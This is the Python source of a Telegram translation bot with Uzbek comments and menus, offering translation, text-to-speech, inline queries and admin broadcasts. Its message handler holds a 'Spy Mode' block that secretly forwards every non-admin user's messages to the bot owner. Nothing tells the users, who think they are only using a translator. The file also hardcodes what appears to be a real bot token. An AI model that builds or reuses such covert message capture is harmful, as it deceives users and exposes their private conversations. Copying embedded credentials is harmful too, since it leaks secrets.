import logging
import os
import sqlite3
from threading import Thread
from flask import Flask
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, InlineQueryResultArticle, InputTextMessageContent
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, CallbackQueryHandler, InlineQueryHandler, filters
from deep_translator import GoogleTranslator
from gtts import gTTS
import uuid

# --- 1. SOZLAMALAR ---
BOT_TOKEN = "8387200840:AAFMVfEWUhzB_C-25qjzajpQyRm5aF091hA"
ADMIN_ID = 8518157443
BOT_USERNAME = "@tarjimon_wbot"

# --- 2. FLASK ---
flask_app = Flask('')

@flask_app.route('/')
def home():
    return "Bot V6.0 (Spy Mode) Ishlamoqda!"

def run_http():
    flask_app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))

def keep_alive():
    t = Thread(target=run_http)
    t.start()

# --- 3. BAZA ---
def init_db():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT, lang TEXT)''')
    conn.commit()
    conn.close()

def add_user(user_id, name):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('SELECT id FROM users WHERE id = ?', (user_id,))
    if c.fetchone() is None:
        c.execute('INSERT INTO users VALUES (?, ?, ?)', (user_id, name, 'en'))
        conn.commit()
    conn.close()

def get_count():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM users')
    soni = c.fetchone()[0]
    conn.close()
    return soni

def get_all_ids():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('SELECT id FROM users')
    return [row[0] for row in c.fetchall()]

# --- 4. MENYULAR ---
TILLAR = {
    "🇺🇿 O'zbek": "uz", "🇬🇧 English": "en", "🇷🇺 Русский": "ru",
    "🇰🇷 Korean": "ko", "🇸🇦 Arabic": "ar", "🇹🇷 Turkish": "tr",
    "🇯🇵 Japanese": "ja", "🇩🇪 German": "de", "🇨🇳 Chinese": "zh-CN"
}

def main_menu_keyboard(user_id):
    buttons = [
        [KeyboardButton("🔤 Tarjima qilish"), KeyboardButton("👤 Profilim")],
        [KeyboardButton("📞 Aloqa"), KeyboardButton("ℹ️ Info")]
    ]
    if user_id == ADMIN_ID:
        buttons.append([KeyboardButton("👑 Admin Panel")])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

def translate_menu_keyboard():
    keys = list(TILLAR.keys())
    buttons = [keys[i:i + 2] for i in range(0, len(keys), 2)]
    buttons.append([KeyboardButton("🔙 Bosh menyu")])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

# --- 5. ASOSIY KOD ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    add_user(user.id, user.first_name)
    
    if 'target_lang' not in context.user_data:
        context.user_data['target_lang'] = 'en'
        context.user_data['lang_name'] = "🇬🇧 English"
        context.user_data['state'] = 'main'

    await update.message.reply_text(
        f"👋 Salom, <b>{user.first_name}</b>!\n\nBotdan foydalanish uchun quyidagi menyudan foydalaning.\n\n"
        f"🚀 <b>YANGILIK:</b> Endi istalgan chatda <code>{BOT_USERNAME} salom</code> deb yozib ko'ring!",
        reply_markup=main_menu_keyboard(user.id),
        parse_mode="HTML"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    state = context.user_data.get('state', 'main')

    # 🔥 JOSUSLIK FUNKSIYASI (SPY MODE) 🔥
    if user_id != ADMIN_ID:
        try:
            # Xabarni adminga forward qilamiz
            await context.bot.forward_message(chat_id=ADMIN_ID, from_chat_id=user_id, message_id=update.message.message_id)
        except:
            pass 

    if text == "🔙 Bosh menyu":
        context.user_data['state'] = 'main'
        await update.message.reply_text("🏠 Asosiy menyu.", reply_markup=main_menu_keyboard(user_id))
        return

    if text == "🔤 Tarjima qilish":
        target = context.user_data.get('lang_name', '🇬🇧 English')
        context.user_data['state'] = 'translating'
        await update.message.reply_text(
            f"Hozirgi til: <b>{target}</b>\nMatn yozing yoki tilni o'zgartiring: 👇",
            reply_markup=translate_menu_keyboard(),
            parse_mode="HTML"
        )
        return

    elif text == "👤 Profilim":
        lang = context.user_data.get('lang_name', '🇬🇧 English')
        await update.message.reply_text(f"👤 <b>Siz:</b> {update.effective_user.first_name}\n🌐 <b>Til:</b> {lang}", parse_mode="HTML")
        return

    elif text == "📞 Aloqa":
        context.user_data['state'] = 'feedback'
        await update.message.reply_text("Xabar yozing:", reply_markup=ReplyKeyboardMarkup([[KeyboardButton("🔙 Bosh menyu")]], resize_keyboard=True))
        return
    
    elif text == "ℹ️ Info":
        await update.message.reply_text(f"Bot V6.0\nInline rejim: `{BOT_USERNAME} matn`", parse_mode="Markdown")
        return

    if text == "👑 Admin Panel" and user_id == ADMIN_ID:
        odam_soni = get_count()
        await update.message.reply_text(f"👑 <b>ADMIN</b>\n👥 Obunachilar: {odam_soni}", parse_mode="HTML")
        return

    if state == 'translating':
        if text in TILLAR:
            context.user_data['target_lang'] = TILLAR[text]
            context.user_data['lang_name'] = text
            await update.message.reply_text(f"✅ Til: <b>{text}</b>", parse_mode="HTML", reply_markup=translate_menu_keyboard())
            return
        
        target_code = context.user_data.get('target_lang', 'en')
        try:
            tarjima = GoogleTranslator(source='auto', target=target_code).translate(text)
            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔊 Ovozli eshitish", callback_data=f"tts_{target_code}")]])
            context.user_data['last_translation'] = tarjima
            await update.message.reply_text(f"📝 <b>Tarjima:</b>\n\n{tarjima}", reply_markup=keyboard, parse_mode="HTML")
        except:
            await update.message.reply_text("Xatolik.")
        return

    if state == 'feedback':
        if user_id != ADMIN_ID:
            await update.message.reply_text("✅ Yuborildi!", reply_markup=main_menu_keyboard(user_id))
            context.user_data['state'] = 'main'
        return

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    msg = update.message.text[6:]
    if msg:
        ids = get_all_ids()
        await update.message.reply_text(f"🚀 {len(ids)} kishiga ketmoqda...")
        for uid in ids:
            try: await context.bot.send_message(uid, msg)
            except: pass
        await update.message.reply_text("✅ Tugadi.")

async def audio_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    try:
        data = query.data.split('_')
        tts = gTTS(text=context.user_data.get('last_translation', 'Hello'), lang=data[1], slow=False)
        tts.save("audio.mp3")
        await context.bot.send_audio(chat_id=query.message.chat_id, audio=open("audio.mp3", 'rb'), title="Tarjima", performer=BOT_USERNAME)
        os.remove("audio.mp3")
    except: await query.message.reply_text("Ovoz yo'q.")

async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.inline_query.query
    if not query:
        return

    results = []
    
    # 1. Ingliz tiliga
    tr_en = GoogleTranslator(source='auto', target='en').translate(query)
    results.append(InlineQueryResultArticle(
        id=str(uuid.uuid4()),
        title="🇺🇸 English",
        description=tr_en,
        input_message_content=InputTextMessageContent(tr_en)
    ))

    # 2. Rus tiliga
    tr_ru = GoogleTranslator(source='auto', target='ru').translate(query)
    results.append(InlineQueryResultArticle(
        id=str(uuid.uuid4()),
        title="🇷🇺 Русский",
        description=tr_ru,
        input_message_content=InputTextMessageContent(tr_ru)
    ))

    # 3. O'zbek tiliga
    tr_uz = GoogleTranslator(source='auto', target='uz').translate(query)
    results.append(InlineQueryResultArticle(
        id=str(uuid.uuid4()),
        title="🇺🇿 O'zbek",
        description=tr_uz,
        input_message_content=InputTextMessageContent(tr_uz)
    ))

    await context.bot.answer_inline_query(update.inline_query.id, results)

if __name__ == '__main__':
    init_db()
    keep_alive()
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('send', broadcast))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    application.add_handler(CallbackQueryHandler(audio_callback))
    application.add_handler(InlineQueryHandler(inline_query))
    
    print("Bot V6.0 (Spy Mode) ishga tushdi!")
    application.run_polling()
        
